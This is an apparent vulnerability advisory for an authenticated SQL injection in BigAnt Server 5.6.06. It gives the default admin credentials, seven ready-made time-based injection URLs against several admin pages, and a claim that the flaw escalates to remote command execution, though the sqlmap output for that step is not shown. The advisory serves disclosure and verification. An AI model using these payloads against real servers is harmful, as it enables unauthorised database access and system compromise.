### BigAnt Server Admin+ Sql Injection

------

#### About BigAnt

BigAnt Office Messenger, LAN Messenger for enterprise, a corporate instant messaging solution. Big Ant includes IM Server, instant messaging, file sharing, voip, video chat and more.

#### Vulnerability Description

Due to BigAnt Server's failure to filter parameters such as account_order, dev_code, and user_count, users with administrator privileges can inject SQL into the application, which can lead to a vulnerability in remote command execution.

#### Affected Version

BigAnt Server 5.6.06

#### Vulnerability Verification Environment

Please refer to the official website for vulnerability construction: https://www.bigantsoft.com/

BigAnt Server installation package download address: https://www.bigantsoft.com/download/bigantim56.zip

#### Vulnerability Recurrence

1. First log in to BigAnt Server with the administrator account. Default account: superadmin, password: 123456;
2. After successful login, you can verify the vulnerability. The URL with SQL injection vulnerability is as follows:
```
http://127.0.0.1:8000/index.php/Admin/user/index/clientid/4.html?account_order=asc;select%20sleep(5)%23
http://127.0.0.1:8000/index.php/Admin/user/index/clientid/4.html?dev_code=asc;select%20sleep(5)%23
http://127.0.0.1:8000/index.php/Admin/Group/index/clientid/4.html?dev_code=desc;select%20sleep(5)%23
http://127.0.0.1:8000/index.php/Admin/Grant/index/clientid/4.html?user_count=asc;select%20sleep(5)%23
http://127.0.0.1:8000/index.php/Admin/Grant/index/clientid/4.html?dev_code=asc;select%20sleep(5)%23
http://127.0.0.1:8000/index.php/Admin/report/group_msg_list/clientid/4.html?dev_code=asc;select%20sleep(5)%23
http://127.0.0.1:8000/index.php/Admin/report/online_list/clientid/4.html?account_order=asc;select%20sleep(5)%23
```

Use sqlmap to detect sql injection vulnerabilities. The results are as follows:



Through the SQL injection vulnerability, it is found that the current user has database administrator rights (root@localhost), and finally remote command execution can be achieved:


